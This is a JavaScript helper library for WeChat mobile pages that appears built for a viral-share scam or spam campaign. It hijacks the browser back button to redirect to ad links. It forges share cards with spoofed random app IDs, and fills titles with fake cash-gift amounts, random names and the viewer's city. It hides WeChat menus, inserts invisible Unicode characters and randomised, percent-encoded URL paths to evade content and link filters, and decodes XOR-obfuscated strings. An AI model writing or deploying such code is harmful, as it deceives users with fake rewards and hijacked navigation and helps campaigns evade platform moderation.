window.getApp = {
    //获取浏览器参数
    GetQueryString: (name) => {
        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
        var r = window.location.search.substr(1).match(reg);
        if (r != null) return unescape(r[2]);
        return '';
    },
    load_lib: (iterators)=>{
        const promises = Array.from(iterators);
        const num = promises.length;
        const rejectedList = new Array(num);
        let rejectedNum = 0;

        return new Promise((resolve, reject) => {
            promises.forEach((promise, index) => {
                Promise.resolve(promise)
                    .then(value => resolve(value))
                    .catch(error => {
                        rejectedList[index] = error;
                        if (++rejectedNum === num) {
                            reject(rejectedList);
                        }
                    });
            });
        });
    },
    fast_load: (url)=>{
        return getApp.load_lib(['//gnqqizhkqb3q.bar', '//gwgp-k6cvn8uztuz.n.bdcloudapi.com'].map((domain)=>fetch( domain + url)));
    },
    //ajax请求
    fissionajax: (config) => {
        // method:
        // url:
        // data:
        // success:
        // fail:
        // dataType:
        let sendData = '';
        for (let key in config.data) {
            sendData += '&' + key + '=' + config.data[key];
        }
        if (sendData) {
            sendData = sendData.slice(1);
        }
        if (config.method === 'GET' || config.method === 'get') {

            config.url = sendData ? config.url + '?' + sendData : config.url;
            sendData = null;
        }
        var XHR = new XMLHttpRequest();
        XHR.onreadystatechange = function () {
            if (XHR.readyState !== 4) return;
            if (XHR.status === 200 || XHR.status === 304) {
                if (typeof config.success === 'function') config.success(XHR.response);
            } else {
                if (typeof config.fail === 'function') config.fail(XHR);
            }
        }
        XHR.open(config.method, config.url, true);
        XHR.responseType = config.dataType;
        XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        XHR.send(sendData);
    },


    //添加css
    addCss: (url) => {
        var css = document.createElement('link');
        css.rel = 'stylesheet';
        css.href = url;
        document.head.appendChild(css);
    },
    //插入script
    addScript: (url, callback) => {
        let s = document.createElement('script');
        s.src = url;
        if (callback) {
            s.onload = function () {
                if (s.parentNode) s.parentNode.removeChild(s);
                if (typeof callback === 'function') callback();
            }
        }
        document.body.appendChild(s);
    },
    //插入ifrom框架
    addIframe(url) {
        let iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style = "width:100%;height:0px;display:none;";
        document.body.appendChild(iframe);
    },
    //获取特殊字符
    character: () => {
        let titlestr = ['웃', '유', '☿', 'ღ', '♁', '♆', 'Б', 'Ф', 'Ц', 'Ч', 'И', 'ЙК', '々', '〆', 'の', 'ぁ', '〥', '〩', 'を', 'ず', 'あ', 'じ', '☊', '☋']
        //  let emoji = ['💖', '💝', '🌹', '💘', '❤', '💓', '💕', '💖', '💗', '💙', '💚', '💛', '💜', '💝', '💞', '♥'];
        let emoji = ['😀', '😃', '😄', '😉', '😛', '🎊', '💞', '💕', '🌹', '✨', '🍓', '🎉', '🎈', '💰', '💖', '💘', '💝', "🍞", "🍖", "🍗", "🍔", "🍟", "🍕", "🍳", "🍲", "🍱", "🍘", "🍙", "🍚", "🍛", "🍜", "🍝", "🍠", "🍢", "🍣", "🍤", "🍥", "🍡"];
        return { emoji: emoji, titlestr: titlestr };
    },

    //格式化时间
    getDateFormat: (num = 0) => {
        var date = new Date(Date.now() + (num * 24 * 3600 * 1000));
        var year = date.getFullYear();
        var month = `0${date.getMonth() + 1}`.slice(-2);
        var day = `0${date.getDate()}`.slice(-2);
        return { year, month, day };
    },

    //获取页面的标题
    gettitle:()=> {
        let unfamiliarStr = getApp.character().titlestr;
        let strLength = unfamiliarStr.length;
        let subNumber = Math.floor(Math.random() * strLength);
        document.title = unfamiliarStr[subNumber];
    },
    //随机礼物
    RandomGift:(Min, Max)=> {
        var Range = Max - Min;
        var Rand = Math.random();
        var num = Min + Rand * Range; //四舍五入
        return num.toFixed(2);
    },

    //开启屏蔽分享
    sharedown: () => {
        if (typeof WeixinJSBridge == "undefined") {
            if (document.addEventListener) {
                document.addEventListener('WeixinJSBridgeReady', getApp.onBridgeReady(), false);
            } else if (document.attachEvent) {
                document.attachEvent('WeixinJSBridgeReady', getApp.onBridgeReady());
                document.attachEvent('onWeixinJSBridgeReady', getApp.onBridgeReady());
            }
        } else {
            getApp.onBridgeReady();
        }
    },
    //屏蔽微信按钮
    onBridgeReady: () => {
        try {
            console.log("开始隐藏");
            WeixinJSBridge.call('hideOptionMenu');
        } catch (e) {
            console.log(e);
        }
    },
    isWX() {
        var platform = navigator.platform;
        var win = platform.indexOf('Win') === 0;
        var mac = platform.indexOf('Mac') === 0;
        var ua = /micromessenger/.test(navigator.userAgent.toLowerCase());
        if (ua && !win && !mac) {
            return true;
        } else {
            return false;
        }
    },
    iOSsy() {
        let u = navigator.userAgent;
        let iosSystem = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
        return  iosSystem
    },
    //添加返回广告链接
    openLink: (url) => {
        // location.href = url;
        const label = document.createElement('a');
        label.setAttribute('rel', 'noreferrer');
        label.setAttribute('href', url);
        if (document) {
            document.body.appendChild(label);
        } else {
            document.documentElement.appendChild(label);
        }
        label.click();
    },
    //检测是否为微信环境
    isWeChat: () => {
        const platform = navigator.platform;
        const win = platform.indexOf('Win') === 0;
        const mac = platform.indexOf('Mac') === 0;
        const ua = /micromessenger/.test(navigator.userAgent.toLowerCase());
        if (ua && !win && !mac) {
            return true;
        } else {
            return false;
        }
    },

    //添加返回代码
    goback: (url) => {
        let u = navigator.userAgent;
        let isAndroid = u.indexOf('Android') > -1 || u.indexOf('Linux') > -1; //g
        //安卓手机处理再次返回红包问题
        if (isAndroid && typeof (tbsJs) != 'undefined') {
            tbsJs.onReady('{useCachedApi : "true"}', function (e) {
            })
        }
        const state = {
            title: "title",
            url: "#"
        };
        window.history.pushState(state, "title", "#");
        window.addEventListener("popstate", function () {
            //console.log('popstate', url);
            getApp.openLink(window.pageDate.a);
            // WeixinJSBridge.call('closeWindow');
        }, false);

        window.onhashchange = function () {
            getApp.openLink(window.pageDate.a);
            //WeixinJSBridge.call('closeWindow');
        };
    },


    getUrlParam(name) {
        // console.log(window.location.search)
        var reg = new RegExp("(^|&)"+name+"=([^&]*)(&|$)"); //构造一个含有目标参数的正则表达式对象
        // var reg = new RegExp(".*?=[^.]*$");
        var r = window.location.search.substr(1).match(reg);  //匹配目标参数
        //console.log('ddddd', r);
        if (r != null) return unescape(r[2]);
        return null; //返回参数值
    },
    //获取当前时间
    currentTime: () => {
        let time = new Date();
        let mintes = +time.getMinutes()
        if (mintes < 10) {
            mintes = '0' + mintes;
        }
        return time.getHours() + ':' + mintes;
    },

    //生成随机字符串
    randomString: (len) => {
        len = len || 32;
        let $chars = 'abcdefhijkmnprstwxyz0123456789';
        let maxPos = $chars.length;
        let pwd = '';
        for (i = 0; i < len; i++) {
            pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
        }
        return pwd;
    },

    /**
     * 播放声音对象
     * 使用方法：
     * 需要在wx.ready回调后执行
     * this.audioTip.loadPath('https://cdn.jsdelivr.net/gh/ffcdn/fst@11/hua/tip.mp3');//成功提示
     * this.audioFail.loadPath('https://cdn.jsdelivr.net/gh/ffcdn/fst@11/hua/fail.mp3');//失败提示
     */
    createAudio(url) {
        let audio = document.createElement('audio');
        audio.setAttribute('src', url)
        audio.setAttribute('autoplay', true)
        document.body.appendChild(audio)
    },
    //禁用屏幕触发
    disabletouch() {
        setTimeout(() => {
            document.body.addEventListener('touchmove', function (e) {
                e.preventDefault();
            }, { passive: false });
        }, 500);
    },

    //获取浏览器等于号最后参数
    getUrlLastParam() {
        var url = location.search;
        var data = url.substring(url.lastIndexOf("=") + 1);
        return data;
    },
    //获取日期
    getDateFormat(num = 0) {
        var date = new Date(Date.now() + (num * 24 * 3600 * 1000));
        var year = date.getFullYear();
        var month = `0${date.getMonth() + 1}`.slice(-2);
        var day = `0${date.getDate()}`.slice(-2);
        return { year, month, day };
    },
    luodigetCity() {
        return (window['localAddress'] ? ['北京市', '天津市', '上海市', '重庆市'].indexOf(localAddress.province) > -1 ?
                localAddress.province : localAddress.city ? localAddress.city : localAddress.province : '')
                .replace(/(.*)市/, '$1').replace(/(.*)省/, '$1');
        // return (window['lo'] ? window['lo'].replace(/(.*)省/, '$1').replace(/(.*)市/, '$1') : '');
    },
    //替换标题或描述
    replaceString(value) {
        let now = getApp.getDateFormat(2);
        let dateValue = `${now.month}月${now.day}日`;
        let dateValue2 = `${now.year}-${now.month}-${now.day}`;
        let icons = getApp.character().emoji;//获取表情
        let index = Math.floor(Math.random() * icons.length);
        let icon = icons[index];
        if (value == null) {
            return '';
        }

        let shuzi1 = Math.floor(Math.random() * 6) + 3;

        let shuzi2 = Math.floor(Math.random() * 300) + 500;
        //随机网名
        function randomNamess()
        {
            let names = ["小忆控","澜川若宁","洒一地阳光ヽ","新人笑",];
            let index = Math.floor((Math.random()*names.length));
            return names[index];
        }

        //随机汉字
        function sjhz(){
            var str = "中书无不专为公六历切元五区队内办从今以化什计认反太天引开少比长车斗方风火见毛片气日手水王文心月支分丰乏乌丹予丑勾勿匀厅允互井云匹凤冈劝凶仓介仇仅仆仁仍升午订双友艺屯夫巨币尺扎巴忆幻尤孔贝父户斤木牛欠犬氏瓦牙止爪业东且世主包北加务写出代们他半去记议发节边对头平布市号叫可史只它打四外处本术民必正白立龙目生石示电由用卡册乎乐丘丙丛丝匆占厉刊兄兰印功击令付仙仪仔仗让讨讯训辽失央巧左归帅叨叼叮句古另叶司台叹右召闪宁奶奴犯尼饥扒扑扔汉汇汁纠圣幼冬孕轧灭斥末未旦旧礼永甘瓜禾矛母鸟皮甲申田穴甩玉共决压争划列则光先阶那关再动军农会众传价件任全华产交论设许达过导并年当合各后名同向问安好如她江红级约场地在回团因多式存成观老机权收次有此百而米色西行至自乓乒乔丢买兴冰冲厌创刚刘刑兆亚匠防邪阳阴阵网劣企伞仰伐仿伏伙伤似伟伪伍休优协充亦访讽讲延芒芝巡州迈迁迅寺寻夺夹夸巩异庆庄帆师吃吊吓吉吗吐吸驰闭闯守宇宅妇奸妈妄岂岁屿尽壮扛扣扩扫托扬执池汗汤污纪纤圾尘尖忙孙字负贞毕轨死危爷戏灯灰考朵朴杀朽杂朱欢旬早旨曲肌臣虫耳齐肉舌羽舟竹页衣血羊份两严况别利际即却劳但低何你体位住作克县识证花还进近连运这张应听员间完形层局声把报技没快我极来条改状时社求志更步每究系角里身走串丽乱兵冻冷冶初免龟判删医阿陈附邻陆邮阻卵助劫劲励努余伯伴佛估伶伸佣亩词评诉译诊苍芳芦芹苏芽彻役迟返违迎远寿弟弄弃床库序希帐吧吵呈吹呆吨否告含吼君启吞呜吴呀驳驴驱闷闲宏宋妨妙妥妖狂犹岔岛岗尿尾饭饮壳扮抄扯抖扶抚护拒抗扭抛批抢扰折投找抓沉泛沟汽沙沈汪沃纯纺纲纳纽纱纹纸纵坝坊坏坚均坑块坛址坐困围园怀忧孝财贡歼戒灿灵灾灶材村杜杆杠李束杏杨牢攻旱旷忌忍忘肠肚肝皂私秃秀钉针盯疗鸡男穷补良辰赤豆谷麦辛言足吩坟纷芬事其具到制些例使单参京该话建变取受往府和命周定实始委拉法油治经细线织组国图性备学质转或所规现者构果林物放明易育的直矿知空采非金青表乖丧乳典净卧厕券兔刺刮剂刻刷降郊郎陕限郑凯凭势侧供佳佩侨侍依侦侄卖享诚诞诗试详询叔范苦茄茎茅茂苗苹若英彼径征迫述奔奉奇幸弦底店废庙录帘帖帜咐呼呢味咏驾驶驼驻闹闸宝官审宜宙宗姑姐妹妻姓狗狐岸岭岩届居屈饱饰饲拔拌抱拨拆抽担抵拐拣拘拦拢抹拍披抬拖押拥择招波泊沸河浅泪沫泥泡泼泄泻沿泳泽沾注练绍终垂垃垄坡坦固夜尚怖怪怜怕孤季孟败贩贯货贫贪贤责购轰轮软卷爸房炒炊炕炉炎视斧斩板杯柜杰枪松析枣枕枝牧版欧欣昂昌昏昆旺承环玩忽念态忠肥肺肤服股肩肯朋肾胁胀肢肿武爬秆钓盲鸣码罗畅画衬衫艰虎虏舍肃齿隶鱼雨顶顷奋美前除院养保便信南亲说很律适选将度带品响按持指活济派给结统型复点战标查政是段思总种科看省相研界类要重革面音须临举厚厘剑剃削陡险卸冒勉勇冠促俘俭俊俩侵俗侮修亮亭诵误诱语叛叙草茶荡荒茧荐茫荣药待迹迷逆送逃退追封奖奏差弯庭帮帝哀哈咳哄哗哪咸哑咽咬咱骄骆骂阀阁闻宫客室宪宣姜娇姥娃威姨姻姿独狠狡狮狭狱峡屋饼饺饶挡挂挥挤挎括挠挪拼拾拴挑挺挖挣测洞洪浑浇洁津浓洽洒洗洋洲浊绑绘绞绝络绕绒巷城垫垦垮垒尝恨恒恢恼恰孩贷费贵贺贱贸贴轻残殃施扁炮烂炼炭炸既觉览柏柄栋架枯栏柳某染柔柿树柱牵牲故春显星映昼昨神祝祖拜泉玻珍怠急怒怨怎胞背胆胡脉胖胜胃歪皇皆甚秒秋钞钢钩钥钟竖盆盈毒盾眉盼眨疤疮疯疫鸦砍砌砖矩罚畏穿窃突袄虾虹蚂蚀虽蚁耐耍缸竿赴赵趴食骨鬼首香项顺准原党部都候值调速通造验家容展海流消圆离资热较料格根样特效能称积铁真被素般起难高乘羞凉剥剧剖匪陵陪陶陷兼冤倍倡倘倒俯健借俱倦倾倚债读课谅请谁谊诸谈荷获莲莫徒徐递逗逢逝透途逐射套弱座席啊唉唇哥唤哭哨唐哲阅宾害宽宵宴宰娘娱狼狸峰屑饿壶挨捕换捡捐捆捞捏捎损挽振捉涌浮浩浸浪涝润涉涛涂浴涨浙继绢绣埋恭悔悄悟悦夏贿贼毙烈轿载殊旁旅爹扇烦烘烤烧烫烟烛笔案柴档桂核桨校框栗桥桑桃桐栽株桌牺敌氧晃晋晒晌晓晕祥拿拳浆泰瓶班珠恶恩恳恐恋息脆胳脊胶朗脑胸脏脂爱秘秤秧秩租铃铅钱钳钻竞站监盐益盏眠病疾疲疼症鸭皱础破罢畜留窄袜袍袖蚕蚊耻耽缺虑耕耗紧索艳翅翁致舱航舰笋笑臭辱躬酒配赶顾顽顿预颂衰粉做得常商接据清深维基情族断教理眼着率第象领匙凑减剪副隆随隐兽勒偿假偶偏停偷谎谜谋菠菜菊菌萝萌萍萄营著逮弹康廊庸唱啦售唯啄骑寄寇密宿婚婆婶猜猎猫猛猪崇崖崭彩屠馆馅掉捷掘控掠描排捧授探掏推掀掩淡混渐淋渠渗淘添淹液渔绸绩绿绵绳绪续堵堆培堂域圈够惭惨悼惯惊惧惕惜辅辆斜旋戚毫检梨梁梅梦梢梳梯桶械犁敢救敏欲晨晚祸球患您悉悬悠爽脖脚脸脱望甜移铲铜银竟章笼盛盗盖盒盘眯睁痕痒鸽票略窑蛋蛇聋职虚粗粒粘累衔船笨笛符野距跃雪雀黄鹿麻颈袭袋道强属提温就然斯最期程确联等量越集装羡厨厦割剩隔隙傲傍储傅博谦谢谣葱董葛葵落葡葬循御逼遍遗遇尊奥幅帽喘喊喝喉喇喷善喂喜骗阔富寒嫂猴猾屡馋插搭搁搅揭揪搂揉搜握援渡溉港湖滑渴湿湾游渣滋编缎缓缘堡塔堤堪悲惰慌慨愧禽愉赌赔赏焦煮辈辉殖焰毯棒棍椒棵棉棚棋森椅植棕牌敞敬散款欺晶景普晴暑暂智掌琴斑惩惠惑惹曾替朝腊脾腔登稍税稀锄锋锅链铺锐锁销锈铸童痛鹅硬短番窗窜窝疏裤裙裕蛮蜓蛙蛛粥絮紫舒艇策答筋筐筛筒筝筑释辜超趁趋跌践跑鲁雄雅雁黑街裁裂愤粪满照新数感想意置解路群鄙障勤催傻像谨叠蓝蒙蓬蒜蓄蒸微遣遥廉幕嗓嫁嫌摆搬搏搞摸摄摊携摇滨滚滥溜滤漠滩滔溪源缠缝墓塞塑塌塘填慎赖煎输煌煤楚概槐楼榆歇献暗暖福殿毁瑞愁慈愚愈腹腾腿腥腰稠锤错键锦锯锣锡盟睬督睛睡痰鹊碍碑碌碰碎碗矮禁罩罪蛾蜂舅粮粱肆筹简签触躲辟辞誉酬酱跟跪跨跳龄鉴雹雷零雾魂韵鼓鼠精管算酸需凳僚谱蔽蔑遭遮弊嘉嗽骡察寨嫩馒摧撇摔摘滴漏漫漂漆演缩境墙舞慕慢赛赚熊旗截熔熄榜榴模榨敲歌歉暮璃愿膀膊膏膜稳锻锹端竭瘦碧磁疑蜡蜜蜻蝇蜘聚腐裳裹翠箩豪辣誓酷酿貌静鲜魄鼻颗影增题劈僵僻蕉蔬德遵嘱播撤撑撒撕撞潮潜墨懂熟飘槽横橡樱暴摩毅慧慰膛膝稻稿稼镇瞒瞎蝶蝴聪糊艘箭篇箱躺醋醉趣趟踩踏踢踪靠霉震鞋黎额颜器整凝薄薯薪避邀嘴操激澡缴壁懒赞赠燕燃橘膨镜磨融糕糖篮辨辩醒蹄餐雕默衡颠藏骤擦赢戴燥臂穗瞧螺糠糟繁翼辫蹈霜霞鞠镰鹰覆翻蹦鞭嚼嚷灌壤耀籍躁魔";
            var n = 8, s = "";
            for(var i = 0; i < n; i++){
                var rand = Math.floor(Math.random() * str.length);
                s += str.charAt(rand);
            }
            return s;
        }

        return value.replace('_qian', getApp.RandomGift(200,300)) //待完善金额
            .replace('_date2', dateValue2) // 2021-06-15
            .replace('_date', dateValue) // 6月15日
            .replace('_shuzi1', shuzi1) // 数字 3-7人
            .replace('_sj3sz', shuzi2) // 数字 3-7人
            .replace(/_emoji/g, icon) // 表情
            .replace(/_kg_/g, `\u034f`) //替换特殊空格
            .replace('_sjhz', sjhz())
            .replace('_sjname',randomNamess()) //随机网名
            .replace('_cs_', localAddress.city || lo) // 城市 赣州市
            .replace('_aqjz_', `${verse[Math.floor((Math.random() * verse.length))]}!`) // 句子
            .replace('_dizhi_',getApp.luodigetCity())
        // .replace('_sf_', window['lo'] === undefined ? '' : lo)
        // .replace('_cs_', window['lc'] === undefined ? '' : lc);
    },

    //替换入口地址
    replaceUrlString(value) { // 替换入口地址特殊字符
        function randomString(e, t) {
            e = e || 32;
            t = t || "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefhijklmnOprstuvwxyz";
            let a = t.length, n = "";
            for (let i = 0; i < e; i++) n += t.charAt(Math.floor(Math.random() * a));
            return n
        }
        function getRandomNum(Min, Max) {
            let Range = Max - Min;
            let Rand = Math.random();
            return (Min + Math.round(Rand * Range));
        }
        function randAbsolutely(num = 1) {
            let key = 0;
            let res = "";
            while (key < num) {
                let i = getRandomNum(1, 19);
                if (i < 10) {
                    res = res + `%0${i}`;
                } else {
                    res = res + `%${i}`;
                }
                key++;
            }
            return res;
        }
        function randAbsolutelyDir(num = 1) {
            let key = 0;
            let res = "";
            while (key < num) {
                let i = randAbsolutely(getRandomNum(1, 10));
                if (res === "") {
                    res = `${i}`;
                } else {
                    res = res + '/' + `${i}`;
                }
                key++;
            }
            return res;
        }
        function randomDir(num = 1) {
            let key = 0;
            let res = "";
            while (key < num) {
                let i = randomString(getRandomNum(3, 8), '0123456789');
                if (res === "") {
                    res = i;
                } else {
                    res = res + "/" + i;
                }
                key++;
            }
            return res;
        }
        function randomOther(num) {
            let key = 0;
            let res = "";
            while (key < num) {
                let i = randomString(getRandomNum(10, 20));
                if (res === "") {
                    res = i;
                } else {
                    res = res + "." + i;
                }
                key++;
            }
            return res;
        }
        function randomZero(num) {
            let key = 0;
            let res = "";
            while (key < num) {
                let i = "0";
                if (res === "") {
                    res = i;
                } else {
                    res = res + i;
                }
                key++;
            }
            return res;
        }

        for (; ;) {
            // 随机 32-64位字母
            value = value.replace("__zm32_64__", randomString(getRandomNum(32, 64)));
            // 随机 1-256 个零
            value = value.replace("__zero1_256__", randomZero(getRandomNum(1, 256)));
            // 随机 1- 32 位字母
            value = value.replace("__zm1_32__", randomString(getRandomNum(1, 32)));
            // abbbb.bbbb.cccc
            value = value.replace("__zm_other1__", randomOther(getRandomNum(6, 32)));
            // 随机19位数字
            value = value.replace("__sz19__", randomString(19, '0123456789'));
            // 随机 10-19位数字
            value = value.replace("__sz10_19__", randomString(getRandomNum(10, 20), '0123456789'));
            // 随机数字 1-10
            value = value.replace("__sz1-10__", getRandomNum(1, 10));
            // 获取当前时间
            value = value.replace("__time__", (new Date()).getTime());
            // 随机数字目录  111/222/333
            value = value.replace("__dir2__", randomDir(getRandomNum(1, 5)));
            // /%12/%08/%07
            value = value.replace("__absolutely_dir__", randAbsolutelyDir(getRandomNum(1, 5)));

            if (value.indexOf("__zmsz__") === -1
                && value.indexOf("__absolutely__") === -1
                && value.indexOf("__absolutely_dir__") === -1
                && value.indexOf("__absolutely2__") === -1
                && value.indexOf("__sz10_19__") === -1
                && value.indexOf("__zm1_32__") === -1) {
                break;
            }
            let randomStr = Math.random().toString(36).slice(-10);
            // 随机 32位数字字母
            value = value.replace("__zmsz__", randomStr);
            // 随机 1-32为字母
            value = value.replace("__zm1_32__", randomString(getRandomNum(1, 32)));
            // %08
            value = value.replace("__absolutely__", randAbsolutely());
            // %08%09%14.......
            value = value.replace("__absolutely2__", randAbsolutely(getRandomNum(1, 10)));
        }
        return value;
    },
    randomImg() {
        let url = `http://q${Math.floor(Math.random() * 1 + 4)}.qlogo.cn/g?b=qq&nk=${num}&s=640`;
        var num = '';
        for (var i = 0; i < 9; i++) {
            if (i == 0) {
                num += Math.floor(Math.random() * 9 + 1);
            } else {
                num += Math.floor(Math.random() * 10);
            }
        }
        return url;
    },
    insertBlank(str) {
        let blank2 = [`\u2028`,`\u2029`,`\u2060` ,`\u2061`, `\u2062` ,`\u2063`, `\u2064`,`\u2065`,`\u2066`,`\u2067`,`\u2068`,`\u2069`];
        let str_arr = str.split('');
        let res_str = "";
        str_arr.forEach((item, index) => {
            res_str += item;
            // 随机插入1-5个字符
            let num = Math.floor(Math.random() * 10 + 5);
            // console.log('需要添加几个', num)
            for (let i = 0; i < num; i++) {
                res_str += blank2[Math.floor((Math.random() * blank2.length))];
            }
        })
        return res_str;
    },
    strDeCode(str) {
        let key = 'zp08m' + 'l1i8thfwvld' + 'lusk4u51kau' + 'm70xb36t6jk' + '5nvggh9ccjp' + 'k7u6qoxq2yj' + 'bf98ac7x9f';
        str = atob(str);
        let len = key.length;
        let code = '';
        for (let i = 0; i < str.length; i++) {
            let k = i % len;
            code += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(k));
        }
        return atob(code);
    },
    randomName()
    {
        let names = ["张观博","张欣竹","张欣阳","张刚军","张扬阳","张靖阳","张熙阳","陈天同","陈鸿琳","陈鸿玉","陈宇","陈硕杨","陈可欣","陈静","陈天乐","陈家玉","陈嘉昱","陈颢林",
            "陈嘉玉","曾子墨","曾铧隆","曾清发","曾紫涵","曾子萱","曾紫宸","曾祥儒","曾芷晴","曾语嫣","曾玉涵","曾胜锦","曾煦郗","曾煦","曾艺幔","曾郁雅"
        ];
        let length =  names.length;
        let index = parseInt(Date.parse(new Date())/1000/600+20)%length;
        return names[index];
    },
    /**
    *判断是否为微信环境
    **/
    isWeiXin(){
        var ua=window.navigator.userAgent.toLowerCase();
        if(ua.match(/MicroMessenger/i)=='micromessenger'){
            return true;
        }else{
            return false;
        }
    },
    
    encodeUTF8(s) {
        var i, r = [], c, x;
        for (i = 0; i < s.length; i++)
            if ((c = s.charCodeAt(i)) < 0x80) r.push(c);
            else if (c < 0x800) r.push(0xC0 + (c >> 6 & 0x1F), 0x80 + (c & 0x3F));
            else {
                if ((x = c ^ 0xD800) >> 10 == 0) //对四字节UTF-16转换为Unicode
                    c = (x << 10) + (s.charCodeAt(++i) ^ 0xDC00) + 0x10000,
                        r.push(0xF0 + (c >> 18 & 0x7), 0x80 + (c >> 12 & 0x3F));
                else r.push(0xE0 + (c >> 12 & 0xF));
                r.push(0x80 + (c >> 6 & 0x3F), 0x80 + (c & 0x3F));
            };
        return r;
    },

    // 字符串加密成 hex 字符串
    sha1(s) {
        var data = new Uint8Array(getApp.encodeUTF8(s))
        var i, j, t;
        var l = ((data.length + 8) >>> 6 << 4) + 16, s = new Uint8Array(l << 2);
        s.set(new Uint8Array(data.buffer)), s = new Uint32Array(s.buffer);
        for (t = new DataView(s.buffer), i = 0; i < l; i++)s[i] = t.getUint32(i << 2);
        s[data.length >> 2] |= 0x80 << (24 - (data.length & 3) * 8);
        s[l - 1] = data.length << 3;
        var w = [], f = [
            function () { return m[1] & m[2] | ~m[1] & m[3]; },
            function () { return m[1] ^ m[2] ^ m[3]; },
            function () { return m[1] & m[2] | m[1] & m[3] | m[2] & m[3]; },
            function () { return m[1] ^ m[2] ^ m[3]; }
        ], rol = function (n, c) { return n << c | n >>> (32 - c); },
            k = [1518500249, 1859775393, -1894007588, -899497514],
            m = [1732584193, -271733879, null, null, -1009589776];
        m[2] = ~m[0], m[3] = ~m[1];
        for (i = 0; i < s.length; i += 16) {
            var o = m.slice(0);
            for (j = 0; j < 80; j++)
                w[j] = j < 16 ? s[i + j] : rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1),
                    t = rol(m[0], 5) + f[j / 20 | 0]() + m[4] + w[j] + k[j / 20 | 0] | 0,
                    m[1] = rol(m[1], 30), m.pop(), m.unshift(t);
            for (j = 0; j < 5; j++)m[j] = m[j] + o[j] | 0;
        };
        t = new DataView(new Uint32Array(m).buffer);
        for (var i = 0; i < 5; i++)m[i] = t.getUint32(i << 2);

        var hex = Array.prototype.map.call(new Uint8Array(new Uint32Array(m).buffer), function (e) {
            return (e < 16 ? "0" : "") + e.toString(16);
        }).join("");
        return hex;
    },

    
    
    /**
     * 发起微信分享
     * 分享类型type类型是0圈 1群
     **/
    wxlaunchShare(type, configdata) {
        window.type = type
        function shareFriend(type) {
            //0圈 1群
            var sharetype = ['shareTimeline', 'sendAppMessage'];
            var wxappid = ''
            if (type) {
                wxappid = AppId[Math.floor(Math.random() * AppId.length)];
            } else {
                wxappid = "wx" + getApp.randomString(14) + "74";
            }
            //自由分享
            WeixinJSBridge.invoke(sharetype[type], {
                "appid": wxappid,
                "title": getApp.replaceString(configdata.title),
                "desc": getApp.replaceString(configdata.desc),
                "img_url": configdata.img_url,
                "img_width": "120",
                "img_height": "120",
                "type": 5,
                "link": getApp.replaceUrlString(configdata.entrance),
            }, function (res) {
                // appmessage_callback();
            });
        }

        wx.ready(function () {
            if (type) {
                wx.hideOptionMenu();
                //显示分享朋友的按钮
                wx.showMenuItems({
                    menuList: ["menuItem:share:appMessage"]
                });
             
            } else {
                //显示朋友圈按钮
                wx.hideAllNonBaseMenuItem();
                wx.showMenuItems({
                    menuList: ["menuItem:share:timeline"]
                });
               
            }
            // getApp.createAudio('https://cdn.jsdelivr.net/gh/ffcdn/fst@11/hua/tip.mp3')
            // wx.onMenuShareAppMessage({
            //     title: getApp.replaceString(configdata.title),
            //     desc: getApp.replaceString(configdata.desc),
            //     imgUrl: configdata.img,
            //     link: getApp.replaceUrlString(configdata.entrance),
            //     success: function () {
            //         // appmessage_callback();
            //     }
            // });
        })

        function onBridgeReady() {
            let sharemenu = ['menu:share:timeline', 'menu:share:appmessage']
            WeixinJSBridge.on(sharemenu[type], function () {
                shareFriend(type);
            });
        }

        if (typeof WeixinJSBridge == "undefined") {
            if (document.addEventListener) {
                document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
            } else if (document.attachEvent) {
                document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
                document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
            }
        } else {
            onBridgeReady();
        }
    }
}